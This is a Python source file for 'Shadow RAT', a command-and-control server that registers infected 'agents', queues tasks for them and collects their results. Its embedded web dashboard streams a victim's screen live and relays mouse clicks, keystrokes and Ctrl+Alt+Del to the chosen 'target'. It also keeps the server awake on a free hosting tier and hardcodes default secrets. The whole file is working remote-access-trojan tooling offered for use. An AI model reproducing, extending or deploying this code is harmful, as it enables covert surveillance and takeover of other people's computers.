#!/usr/bin/env python3
"""
Shadow RAT — C2 Server (Flask + Flask-SocketIO)
Live screen streaming + remote control via WebSocket
"""
import os, json, sqlite3, threading, base64, time
from datetime import datetime, timezone
from flask import Flask, request, jsonify, render_template_string
from flask_socketio import SocketIO, emit, join_room, leave_room

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get("FLASK_SECRET", "shadow_secret_2024")
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading',
                    max_http_buffer_size=5 * 1024 * 1024)  # 5MB for frames

SECRET_KEY = os.environ.get("C2_SECRET_KEY", "Youssef123")
DB_PATH    = os.environ.get("DB_PATH", "/tmp/shadow.db")
_lock      = threading.Lock()

# live frame buffer: {agent_id: {"frame": b64str, "ts": float}}
_live_frames = {}
_live_lock   = threading.Lock()

# pending control events per agent: {agent_id: [{"type": "mouse_move", ...}]}
_ctrl_queue  = {}
_ctrl_lock   = threading.Lock()

# ══════════════════════════════════════════════════════════════
#  DATABASE
# ══════════════════════════════════════════════════════════════
def get_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as db:
        db.executescript("""
        CREATE TABLE IF NOT EXISTS agents (
            agent_id  TEXT PRIMARY KEY,
            hostname  TEXT,
            username  TEXT,
            os        TEXT,
            arch      TEXT,
            ip        TEXT,
            last_seen TEXT,
            status    TEXT DEFAULT 'offline',
            extra     TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS tasks (
            task_id   TEXT PRIMARY KEY,
            agent_id  TEXT,
            action    TEXT,
            args      TEXT DEFAULT '{}',
            status    TEXT DEFAULT 'pending',
            result       TEXT DEFAULT '',
            progress_log TEXT DEFAULT '',
            issued_at    TEXT
        );
        """)
    print(f"[*] SQLite DB ready: {DB_PATH}")

init_db()

# ── Self keep-alive: prevent Render free-tier sleep ────────────
import threading as _ka_th, urllib.request as _ka_req

def _self_ping():
    import time as _t
    _t.sleep(60)  # wait for server to fully start
    while True:
        try:
            _ka_req.urlopen(
                f"http://localhost:{os.environ.get('PORT', 5000)}/functions/c2Server",
                data=b'{"route":"stats","key":"' + SECRET_KEY.encode() + b'"}',
                timeout=10
            )
        except Exception:
            pass
        _t.sleep(840)  # ping every 14 minutes

_ka_th.Thread(target=_self_ping, daemon=True).start()


# ══════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════
def now_iso():
    return datetime.now(timezone.utc).isoformat()

_task_counter = [0]
_counter_lock = threading.Lock()

def new_task_id():
    with _counter_lock:
        with get_db() as db:
            row = db.execute(
                "SELECT task_id FROM tasks ORDER BY rowid DESC LIMIT 1"
            ).fetchone()
            if row:
                try: _task_counter[0] = int(row["task_id"].split("_")[1])
                except: pass
        _task_counter[0] += 1
        return f"task_{_task_counter[0]:06d}"

def check_auth(body):
    key = body.get("key") or request.headers.get("x-shadow-key", "")
    return key == SECRET_KEY

def is_online(last_seen_iso, threshold=30):
    try:
        ls = datetime.fromisoformat(last_seen_iso).timestamp()
        return (datetime.now(timezone.utc).timestamp() - ls) <= threshold
    except:
        return False

# ══════════════════════════════════════════════════════════════
#  LIVE DASHBOARD HTML
# ══════════════════════════════════════════════════════════════
LIVE_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Shadow C2 — Live Control</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #0a0a0f; color: #e0e0e0; font-family: 'Courier New', monospace; }
  
  .header {
    background: #111118;
    border-bottom: 1px solid #ff003322;
    padding: 12px 20px;
    display: flex;
    align-items: center;
    gap: 15px;
  }
  .header h1 { color: #ff0033; font-size: 18px; letter-spacing: 2px; }
  .status-dot { width: 10px; height: 10px; border-radius: 50%; background: #333; display: inline-block; }
  .status-dot.online { background: #00ff88; box-shadow: 0 0 8px #00ff88; }
  .status-dot.streaming { background: #ff0033; box-shadow: 0 0 8px #ff0033; animation: pulse 1s infinite; }
  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
  
  .agent-bar {
    background: #111118;
    padding: 10px 20px;
    display: flex;
    align-items: center;
    gap: 15px;
    border-bottom: 1px solid #1a1a2e;
    flex-wrap: wrap;
  }
  select {
    background: #1a1a2e;
    color: #e0e0e0;
    border: 1px solid #ff003344;
    padding: 6px 10px;
    border-radius: 4px;
    font-family: monospace;
  }
  button {
    background: #ff003322;
    color: #ff0033;
    border: 1px solid #ff003366;
    padding: 6px 14px;
    border-radius: 4px;
    cursor: pointer;
    font-family: monospace;
    font-size: 12px;
    transition: all 0.2s;
  }
  button:hover { background: #ff003344; }
  button.active { background: #ff003366; }
  .btn-green { background: #00ff8822; color: #00ff88; border-color: #00ff8866; }
  .btn-green:hover { background: #00ff8844; }
  
  .main {
    display: flex;
    height: calc(100vh - 100px);
  }
  
  .screen-container {
    flex: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #05050a;
    position: relative;
    overflow: hidden;
  }
  
  #screen-canvas {
    max-width: 100%;
    max-height: 100%;
    border: 1px solid #ff003322;
    cursor: crosshair;
    image-rendering: pixelated;
  }
  
  .no-stream {
    text-align: center;
    color: #444;
  }
  .no-stream .icon { font-size: 48px; margin-bottom: 10px; }
  
  .sidebar {
    width: 260px;
    background: #111118;
    border-left: 1px solid #1a1a2e;
    display: flex;
    flex-direction: column;
    overflow: hidden;
  }
  
  .sidebar-section {
    padding: 12px;
    border-bottom: 1px solid #1a1a2e;
  }
  .sidebar-section h3 { color: #ff0033; font-size: 11px; letter-spacing: 1px; margin-bottom: 8px; }
  
  .info-row { display: flex; justify-content: space-between; font-size: 11px; margin: 3px 0; }
  .info-row span:last-child { color: #00ff88; }
  
  .fps-bar { background: #1a1a2e; height: 4px; border-radius: 2px; margin-top: 5px; }
  .fps-fill { background: #ff0033; height: 100%; border-radius: 2px; transition: width 0.3s; }
  
  .log {
    flex: 1;
    overflow-y: auto;
    padding: 10px;
    font-size: 10px;
    color: #666;
  }
  .log-entry { margin: 2px 0; }
  .log-entry.ctrl { color: #00aaff; }
  .log-entry.frame { color: #444; }
  .log-entry.warn { color: #ffaa00; }
  
  .controls { padding: 10px; display: flex; gap: 6px; flex-wrap: wrap; }
  
  #quality-slider { width: 100%; accent-color: #ff0033; }
  
  .overlay {
    position: absolute;
    top: 8px; right: 8px;
    background: #ff003388;
    color: #fff;
    padding: 3px 8px;
    border-radius: 3px;
    font-size: 11px;
    display: none;
  }
  .overlay.show { display: block; }
</style>
</head>
<body>

<div class="header">
  <h1>⬡ SHADOW C2 — LIVE CONTROL</h1>
  <span class="status-dot" id="conn-dot"></span>
  <span id="conn-label" style="font-size:12px;color:#666">Disconnected</span>
  <span class="status-dot streaming" id="stream-dot" style="display:none"></span>
  <span id="stream-label" style="font-size:12px;color:#666;display:none">LIVE</span>
</div>

<div class="agent-bar">
  <span style="font-size:12px;color:#666">TARGET:</span>
  <select id="agent-select">
    <option value="">-- Select Agent --</option>
  </select>
  <button class="btn-green" id="btn-start" onclick="startStream()">▶ START STREAM</button>
  <button onclick="stopStream()" id="btn-stop" style="display:none">⏹ STOP</button>
  <button onclick="takeScreenshot()">📷 Screenshot</button>
  <button onclick="sendCtrlAltDel()">⌨ C+A+Del</button>
  <span style="font-size:11px;color:#555;margin-left:auto">FPS: <span id="fps-val">0</span></span>
</div>

<div class="main">
  <div class="screen-container" id="screen-container">
    <div class="no-stream" id="no-stream-msg">
      <div class="icon">🖥</div>
      <div>Select a target and start stream</div>
    </div>
    <canvas id="screen-canvas" style="display:none"></canvas>
    <div class="overlay" id="click-overlay">CLICK SENT</div>
  </div>
  
  <div class="sidebar">
    <div class="sidebar-section">
      <h3>▸ TARGET INFO</h3>
      <div class="info-row"><span>Agent ID</span><span id="info-id">—</span></div>
      <div class="info-row"><span>Hostname</span><span id="info-host">—</span></div>
      <div class="info-row"><span>OS</span><span id="info-os">—</span></div>
      <div class="info-row"><span>Resolution</span><span id="info-res">—</span></div>
      <div class="info-row"><span>Latency</span><span id="info-lat">— ms</span></div>
      <div class="fps-bar"><div class="fps-fill" id="fps-fill" style="width:0%"></div></div>
    </div>
    
    <div class="sidebar-section">
      <h3>▸ STREAM QUALITY</h3>
      <div style="font-size:11px;color:#666;margin-bottom:5px">JPEG Quality: <span id="q-val">40</span>%</div>
      <input type="range" id="quality-slider" min="10" max="85" value="40" oninput="updateQuality(this.value)">
    </div>
    
    <div class="sidebar-section">
      <h3>▸ QUICK ACTIONS</h3>
      <div class="controls">
        <button onclick="sendKey('ctrl+c')">Ctrl+C</button>
        <button onclick="sendKey('ctrl+v')">Ctrl+V</button>
        <button onclick="sendKey('ctrl+z')">Ctrl+Z</button>
        <button onclick="sendKey('win')">Win</button>
        <button onclick="sendKey('escape')">Esc</button>
        <button onclick="sendKey('enter')">Enter</button>
      </div>
    </div>
    
    <div class="sidebar-section" style="flex:1">
      <h3>▸ EVENT LOG</h3>
      <div class="log" id="log"></div>
    </div>
  </div>
</div>

<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<script>
const socket = io();
let selectedAgent = null;
let streaming = false;
let canvas = document.getElementById('screen-canvas');
let ctx = canvas.getContext('2d');
let lastFrameTime = Date.now();
let frameCount = 0;
let fpsInterval;
let quality = 40;
let scaleX = 1, scaleY = 1;
let origW = 1920, origH = 1080;
let pingStart = 0;

// ── Socket events ─────────────────────────────────────
socket.on('connect', () => {
  document.getElementById('conn-dot').className = 'status-dot online';
  document.getElementById('conn-label').textContent = 'Connected';
  log('Connected to C2 server', 'ctrl');
  loadAgents();
});

socket.on('connect_error', () => {
  document.getElementById('conn-dot').className = 'status-dot';
  document.getElementById('conn-label').textContent = 'WS Error - polling mode';
  // Still load agents via HTTP even if WS fails
  loadAgents();
});

socket.on('disconnect', () => {
  document.getElementById('conn-dot').className = 'status-dot';
  document.getElementById('conn-label').textContent = 'Disconnected';
  log('Disconnected', 'warn');
});

// ── renderFrame shared by WS and HTTP polling ────────────
function renderFrame(data) {
  const img = new Image();
  img.onload = () => {
    origW = data.width || img.naturalWidth;
    origH = data.height || img.naturalHeight;
    if (canvas.width !== origW || canvas.height !== origH) {
      canvas.width = origW;
      canvas.height = origH;
      updateScale();
    }
    ctx.drawImage(img, 0, 0);
    frameCount++;
    document.getElementById('info-res').textContent = `${origW}x${origH}`;
    if (data.ts) {
      document.getElementById('info-lat').textContent = `${Date.now() - data.ts}ms`;
    }
  };
  img.src = 'data:image/jpeg;base64,' + data.frame;
}

// WebSocket path
socket.on('frame', (data) => {
  if (!streaming || data.agent_id !== selectedAgent) return;
  renderFrame(data);
});

// HTTP polling fallback (fires every 300ms)
let _pollTimer = null;
let _lastFrameTs = 0;

function startPollFrames() {
  if (_pollTimer) return;
  _pollTimer = setInterval(async () => {
    if (!streaming || !selectedAgent) return;
    try {
      const res = await fetch(`/live/frame/${selectedAgent}?key={{ secret }}`);
      const d = await res.json();
      if (d.frame && d.ts !== _lastFrameTs) {
        _lastFrameTs = d.ts;
        renderFrame(d);
      }
    } catch(e) {}
  }, 300);
}

function stopPollFrames() {
  if (_pollTimer) { clearInterval(_pollTimer); _pollTimer = null; }
  _lastFrameTs = 0;
}

socket.on('agents_list', (data) => {
  const sel = document.getElementById('agent-select');
  const current = sel.value;
  sel.innerHTML = '<option value="">-- Select Agent --</option>';
  data.agents.forEach(a => {
    const opt = document.createElement('option');
    opt.value = a.agent_id;
    opt.textContent = `${a.hostname} (${a.ip}) [${a.os}]`;
    sel.appendChild(opt);
  });
  if (current) sel.value = current;
});

// ── FPS counter ───────────────────────────────────────
function startFpsCounter() {
  fpsInterval = setInterval(() => {
    document.getElementById('fps-val').textContent = frameCount;
    const pct = Math.min(frameCount / 10 * 100, 100);
    document.getElementById('fps-fill').style.width = pct + '%';
    frameCount = 0;
  }, 1000);
}

// ── Agent loading ─────────────────────────────────────
let _agentsTimer = null;
function loadAgents() {
  fetch('/functions/c2Server', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({route: 'agents', key: '{{ secret }}'})
  })
  .then(r => r.json())
  .then(data => {
    const sel = document.getElementById('agent-select');
    const current = sel.value;
    sel.innerHTML = '<option value="">-- Select Agent --</option>';
    const agents = data.agents || [];
    agents.forEach(a => {
      const opt = document.createElement('option');
      opt.value = a.agent_id;
      opt.textContent = `${a.hostname || a.agent_id} (${a.ip}) [${a.os}]`;
      sel.appendChild(opt);
    });
    if (current) sel.value = current;
    // Update agent count in header
    document.getElementById('conn-label').textContent = 
      `Connected | ${agents.length} agent${agents.length !== 1 ? 's' : ''} online`;
  })
  .catch(e => log('Failed to load agents: ' + e, 'warn'));
  
  if (!_agentsTimer) _agentsTimer = setInterval(loadAgents, 5000);
}

// Load agents immediately on page load (no need to wait for socket)
window.addEventListener('DOMContentLoaded', () => {
  loadAgents();
});

document.getElementById('agent-select').addEventListener('change', function() {
  selectedAgent = this.value;
  if (selectedAgent) {
    const opt = this.options[this.selectedIndex];
    document.getElementById('info-id').textContent = selectedAgent.substring(0,12) + '...';
    document.getElementById('info-host').textContent = opt.textContent.split('(')[0].trim();
    log(`Target selected: ${selectedAgent}`, 'ctrl');
  }
});

// ── Stream control ────────────────────────────────────
function startStream() {
  if (!selectedAgent) { log('No agent selected!', 'warn'); return; }
  streaming = true;
  socket.emit('join_live', {agent_id: selectedAgent, key: '{{ secret }}'});
  startPollFrames();  // HTTP polling fallback
  
  // Issue live task to agent via C2
  fetch('/functions/c2Server', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      route: 'task', key: '{{ secret }}',
      agent_id: selectedAgent,
      action: 'live',
      args: {quality: quality, fps: 5}
    })
  }).then(r => r.json()).then(d => log(`Live task issued: ${d.task_id}`, 'ctrl'));
  
  document.getElementById('no-stream-msg').style.display = 'none';
  canvas.style.display = 'block';
  document.getElementById('btn-stop').style.display = 'inline';
  document.getElementById('stream-dot').style.display = 'inline-block';
  document.getElementById('stream-label').style.display = 'inline';
  startFpsCounter();
  log('Stream started', 'ctrl');
}

function stopStream() {
  streaming = false;
  socket.emit('leave_live', {agent_id: selectedAgent});
  
  fetch('/functions/c2Server', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      route: 'task', key: '{{ secret }}',
      agent_id: selectedAgent,
      action: 'live_stop',
      args: {}
    })
  });
  
  clearInterval(fpsInterval);
  document.getElementById('btn-stop').style.display = 'none';
  document.getElementById('stream-dot').style.display = 'none';
  document.getElementById('stream-label').style.display = 'none';
  log('Stream stopped', 'warn');
}

// ── Canvas interaction ────────────────────────────────
function updateScale() {
  const rect = canvas.getBoundingClientRect();
  scaleX = origW / rect.width;
  scaleY = origH / rect.height;
}

window.addEventListener('resize', updateScale);

canvas.addEventListener('mousemove', (e) => {
  if (!streaming) return;
  const rect = canvas.getBoundingClientRect();
  const x = Math.round((e.clientX - rect.left) * scaleX);
  const y = Math.round((e.clientY - rect.top) * scaleY);
  socket.emit('ctrl_event', {
    agent_id: selectedAgent, key: '{{ secret }}',
    type: 'mouse_move', x, y
  });
});

canvas.addEventListener('click', (e) => {
  if (!streaming) return;
  const rect = canvas.getBoundingClientRect();
  const x = Math.round((e.clientX - rect.left) * scaleX);
  const y = Math.round((e.clientY - rect.top) * scaleY);
  const btn = e.button === 2 ? 'right' : 'left';
  socket.emit('ctrl_event', {
    agent_id: selectedAgent, key: '{{ secret }}',
    type: 'mouse_click', x, y, button: btn
  });
  // visual feedback
  const ov = document.getElementById('click-overlay');
  ov.className = 'overlay show';
  setTimeout(() => ov.className = 'overlay', 500);
  log(`Click @ ${x},${y}`, 'ctrl');
});

canvas.addEventListener('dblclick', (e) => {
  if (!streaming) return;
  const rect = canvas.getBoundingClientRect();
  const x = Math.round((e.clientX - rect.left) * scaleX);
  const y = Math.round((e.clientY - rect.top) * scaleY);
  socket.emit('ctrl_event', {
    agent_id: selectedAgent, key: '{{ secret }}',
    type: 'mouse_dblclick', x, y
  });
  log(`DblClick @ ${x},${y}`, 'ctrl');
});

canvas.addEventListener('contextmenu', (e) => {
  e.preventDefault();
  if (!streaming) return;
  const rect = canvas.getBoundingClientRect();
  const x = Math.round((e.clientX - rect.left) * scaleX);
  const y = Math.round((e.clientY - rect.top) * scaleY);
  socket.emit('ctrl_event', {
    agent_id: selectedAgent, key: '{{ secret }}',
    type: 'mouse_click', x, y, button: 'right'
  });
  log(`Right-click @ ${x},${y}`, 'ctrl');
});

canvas.addEventListener('wheel', (e) => {
  if (!streaming) return;
  socket.emit('ctrl_event', {
    agent_id: selectedAgent, key: '{{ secret }}',
    type: 'scroll', dy: e.deltaY > 0 ? 3 : -3
  });
});

document.addEventListener('keydown', (e) => {
  if (!streaming || !selectedAgent) return;
  if (document.activeElement.tagName === 'INPUT' || 
      document.activeElement.tagName === 'SELECT') return;
  e.preventDefault();
  const combo = buildKeyCombo(e);
  socket.emit('ctrl_event', {
    agent_id: selectedAgent, key: '{{ secret }}',
    type: 'key_press', key: combo
  });
  log(`Key: ${combo}`, 'ctrl');
});

function buildKeyCombo(e) {
  let parts = [];
  if (e.ctrlKey && e.key !== 'Control') parts.push('ctrl');
  if (e.altKey && e.key !== 'Alt') parts.push('alt');
  if (e.shiftKey && e.key !== 'Shift') parts.push('shift');
  const k = e.key.length === 1 ? e.key.toLowerCase() : e.key.toLowerCase();
  parts.push(k);
  return parts.join('+');
}

function sendKey(combo) {
  if (!selectedAgent) return;
  socket.emit('ctrl_event', {
    agent_id: selectedAgent, key: '{{ secret }}',
    type: 'key_press', key: combo
  });
  log(`Key: ${combo}`, 'ctrl');
}

function sendCtrlAltDel() { sendKey('ctrl+alt+delete'); }

function takeScreenshot() {
  if (!selectedAgent) return;
  fetch('/functions/c2Server', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      route: 'task', key: '{{ secret }}',
      agent_id: selectedAgent, action: 'screenshot', args: {}
    })
  }).then(r => r.json()).then(d => log(`Screenshot task: ${d.task_id}`, 'ctrl'));
}

function updateQuality(v) {
  quality = parseInt(v);
  document.getElementById('q-val').textContent = v;
}

function log(msg, type='frame') {
  const el = document.getElementById('log');
  const d = document.createElement('div');
  d.className = `log-entry ${type}`;
  d.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
  el.appendChild(d);
  el.scrollTop = el.scrollHeight;
  if (el.children.length > 200) el.removeChild(el.firstChild);
}
</script>
</body>
</html>
"""

# ══════════════════════════════════════════════════════════════
#  SOCKET.IO EVENTS
# ══════════════════════════════════════════════════════════════
@socketio.on('join_live')
def on_join_live(data):
    if data.get('key') != SECRET_KEY:
        return
    agent_id = data.get('agent_id')
    join_room(f"live_{agent_id}")

@socketio.on('leave_live')
def on_leave_live(data):
    agent_id = data.get('agent_id')
    leave_room(f"live_{agent_id}")

@socketio.on('ctrl_event')
def on_ctrl_event(data):
    if data.get('key') != SECRET_KEY:
        return
    agent_id = data.get('agent_id')
    event = {k: v for k, v in data.items() if k not in ('key', 'agent_id')}
    with _ctrl_lock:
        if agent_id not in _ctrl_queue:
            _ctrl_queue[agent_id] = []
        _ctrl_queue[agent_id].append(event)
        # Keep max 50 events queued
        _ctrl_queue[agent_id] = _ctrl_queue[agent_id][-50:]

# ══════════════════════════════════════════════════════════════
#  LIVE FRAME PUSH (called by agent via HTTP)
# ══════════════════════════════════════════════════════════════
@app.route("/live/frame", methods=["POST"])
def push_frame():
    body = request.get_json(silent=True) or {}
    if not check_auth(body):
        return jsonify({"error": "Unauthorized"}), 401
    
    agent_id = body.get("agent_id")
    frame    = body.get("frame")   # base64 JPEG
    width    = body.get("width", 1920)
    height   = body.get("height", 1080)
    
    if not agent_id or not frame:
        return jsonify({"error": "missing fields"}), 400
    
    # Store latest frame
    with _live_lock:
        _live_frames[agent_id] = {"frame": frame, "ts": int(time.time() * 1000), "width": width, "height": height}
    
    # Broadcast to dashboard viewers
    socketio.emit('frame', {
        "agent_id": agent_id,
        "frame": frame,
        "width": width,
        "height": height,
        "ts": int(time.time() * 1000)
    }, room=f"live_{agent_id}")
    
    # Return pending control events to agent
    with _ctrl_lock:
        events = _ctrl_queue.pop(agent_id, [])
    
    return jsonify({"ok": True, "events": events})

# ══════════════════════════════════════════════════════════════
#  LIVE FRAME PULL (browser polls this directly)
# ══════════════════════════════════════════════════════════════
@app.route("/live/frame/<agent_id>", methods=["GET"])
def get_frame(agent_id):
    key_param = request.args.get("key", "")
    if key_param != SECRET_KEY:
        return "Unauthorized", 401
    with _live_lock:
        data = _live_frames.get(agent_id)
    if not data:
        return jsonify({"frame": None, "ts": 0})
    return jsonify({"frame": data["frame"], "ts": data["ts"],
                    "width": data.get("width", 800), "height": data.get("height", 600)})

# ══════════════════════════════════════════════════════════════
#  HEALTH CHECK
# ══════════════════════════════════════════════════════════════
@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "ts": int(time.time())})

# ══════════════════════════════════════════════════════════════
#  LIVE DASHBOARD ROUTE
# ══════════════════════════════════════════════════════════════
@app.route("/live")
def live_dashboard():
    key_param = request.args.get("key", "")
    if key_param != SECRET_KEY:
        return "Unauthorized", 401
    return render_template_string(LIVE_HTML, secret=SECRET_KEY)

# ══════════════════════════════════════════════════════════════
#  MAIN C2 ROUTE (preserved from original)
# ══════════════════════════════════════════════════════════════
@app.route("/functions/c2Server", methods=["POST", "GET"])
def c2():
    body  = request.get_json(silent=True) or {}
    route = request.args.get("route") or body.get("route", "")

    if not check_auth(body):
        return jsonify({"error": "Unauthorized"}), 401

    with _lock:

        if route == "checkin":
            agent_id = body.get("agent_id")
            if not agent_id:
                return jsonify({"error": "missing agent_id"}), 400

            with get_db() as db:
                db.execute("""
                    INSERT INTO agents (agent_id,hostname,username,os,arch,ip,last_seen,status,extra)
                    VALUES (?,?,?,?,?,?,?,'online',?)
                    ON CONFLICT(agent_id) DO UPDATE SET
                        hostname=excluded.hostname, username=excluded.username,
                        os=excluded.os, arch=excluded.arch, ip=excluded.ip,
                        last_seen=excluded.last_seen, status='online', extra=excluded.extra
                """, (
                    agent_id,
                    body.get("hostname","?"), body.get("username","?"),
                    body.get("os","?"), body.get("arch","?"),
                    body.get("ip","?"), now_iso(), body.get("extra","")
                ))
                row = db.execute("""
                    SELECT * FROM tasks
                    WHERE agent_id=? AND status='pending'
                    ORDER BY rowid ASC LIMIT 1
                """, (agent_id,)).fetchone()
                if row:
                    db.execute("UPDATE tasks SET status='sent' WHERE task_id=?", (row["task_id"],))
                    return jsonify({
                        "task_id": row["task_id"],
                        "action":  row["action"],
                        "args":    json.loads(row["args"] or "{}"),
                    })
            return jsonify({"task_id": None})

        if route == "result":
            task_id = body.get("task_id")
            if not task_id:
                return jsonify({"error": "missing task_id"}), 400
            with get_db() as db:
                row = db.execute("SELECT * FROM tasks WHERE task_id=?", (task_id,)).fetchone()
                if not row:
                    return jsonify({"error": "not found"}), 404
                result_val = body.get("result", "")
                status_val = body.get("status", "done")
                if status_val == "progress":
                    # Append to progress_log (non-blocking live lines)
                    existing = db.execute(
                        "SELECT progress_log FROM tasks WHERE task_id=?", (task_id,)
                    ).fetchone()
                    prev    = (existing[0] or "") if existing else ""
                    new_log = prev + result_val + "\n"
                    db.execute(
                        "UPDATE tasks SET progress_log=? WHERE task_id=?",
                        (new_log, task_id)
                    )
                else:
                    db.execute(
                        "UPDATE tasks SET result=?, status=? WHERE task_id=?",
                        (result_val, status_val, task_id)
                    )
            return jsonify({"ok": True})

        # ── append_line: agent posts a single live log line ─────
        if route == "append_line":
            task_id = body.get("task_id")
            line    = body.get("line", "")
            if not task_id:
                return jsonify({"error": "missing task_id"}), 400
            with get_db() as db:
                existing = db.execute(
                    "SELECT progress_log FROM tasks WHERE task_id=?", (task_id,)
                ).fetchone()
                if not existing:
                    return jsonify({"error": "not found"}), 404
                prev    = (existing[0] or "")
                new_log = prev + line + "\n"
                db.execute(
                    "UPDATE tasks SET progress_log=? WHERE task_id=?",
                    (new_log, task_id)
                )
            return jsonify({"ok": True})

        if route == "agents":
            with get_db() as db:
                rows = db.execute("SELECT * FROM agents").fetchall()
            result = []
            for r in rows:
                a = dict(r)
                a["status"] = "online" if is_online(a.get("last_seen","")) else "offline"
                result.append(a)
            online = [a for a in result if a["status"] == "online"]
            return jsonify({"agents": online, "total": len(result)})

        if route == "task":
            agent_id = body.get("agent_id")
            action   = body.get("action")
            if not agent_id or not action:
                return jsonify({"error": "missing fields"}), 400
            tid = new_task_id()
            with get_db() as db:
                db.execute("""
                    INSERT INTO tasks (task_id,agent_id,action,args,status,result,issued_at)
                    VALUES (?,?,?,?,'pending','',?)
                """, (tid, agent_id, action, json.dumps(body.get("args",{})), now_iso()))
            return jsonify({"task_id": tid})

        if route == "get_result":
            task_id = body.get("task_id")
            if not task_id:
                return jsonify({"error": "missing task_id"}), 400
            with get_db() as db:
                row = db.execute("SELECT * FROM tasks WHERE task_id=?", (task_id,)).fetchone()
            if not row:
                return jsonify({"error": "not found"}), 404
            row_dict = dict(row)
            # Fetch progress_log separately (for streaming)
            with get_db() as db2:
                prow = db2.execute(
                    "SELECT progress_log FROM tasks WHERE task_id=?", (task_id,)
                ).fetchone()
                row_dict["progress_log"] = (prow[0] or "") if prow else ""
            return jsonify(row_dict)

        if route == "delete_agent":
            agent_id = body.get("agent_id")
            if agent_id:
                with get_db() as db:
                    db.execute("DELETE FROM agents WHERE agent_id=?", (agent_id,))
            return jsonify({"ok": True})

        if route == "stats":
            with get_db() as db:
                total_agents = db.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
                total_tasks  = db.execute("SELECT COUNT(*) FROM tasks").fetchone()[0]
                pending      = db.execute("SELECT COUNT(*) FROM tasks WHERE status='pending'").fetchone()[0]
            return jsonify({
                "total_agents": total_agents, "total_tasks": total_tasks, "pending_tasks": pending
            })

        return jsonify({"error": f"Unknown route: {route}"}), 400


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host="0.0.0.0", port=port, debug=False)
